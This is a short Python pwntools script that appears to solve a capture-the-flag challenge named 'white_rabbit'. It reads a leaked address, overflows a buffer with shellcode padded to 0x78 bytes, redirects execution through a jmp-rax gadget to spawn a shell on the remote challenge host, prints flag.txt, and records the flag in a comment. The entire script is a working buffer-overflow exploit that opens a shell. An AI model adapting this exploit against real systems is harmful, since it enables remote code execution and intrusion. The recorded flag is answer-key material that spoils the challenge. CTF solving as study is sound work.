#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./white_rabbit", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b follow")
p = remote("whiterabbit.chal.wwctf.com", 1337)

p.readuntil(b"> ")
leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["main"]

JMP_RAX = 0x00000000000010bf
# gets sets rax to &buf

payload = asm(shellcraft.sh())
payload = payload.ljust(0x78, b"A")
payload += p64(JMP_RAX + elf.address)
p.sendline(payload)

p.sendline(b"/bin/cat flag.txt")

p.interactive() # wwf{jmp_d0wn_th3_r4bb1t_h0le_0caba44088}
